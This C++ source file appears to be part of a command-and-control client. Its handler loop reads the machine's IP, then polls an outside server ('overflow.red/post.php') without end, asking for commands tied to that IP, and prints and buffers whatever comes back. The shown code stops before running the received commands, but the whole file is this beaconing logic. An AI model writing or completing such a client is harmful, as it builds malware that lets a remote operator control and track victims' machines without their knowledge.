#include "communication.h"
#include <iostream>

#include "..\utility\requests.h"
#include "functions.h"

namespace client {
	namespace communication {
		void handler_loop() {
			auto ip = client::functions::get_ip();
			while (true) {
				auto cmd = requests::get_request("https://overflow.red/post.php", "cmd=get_command&ip=" + ip);
				if (!cmd.empty()) {	
					std::cout << cmd << std::endl;

					char buff[256];
					sprintf_s(buff, "%s", cmd.c_str());
	
					
				}
			}
		}
	}
}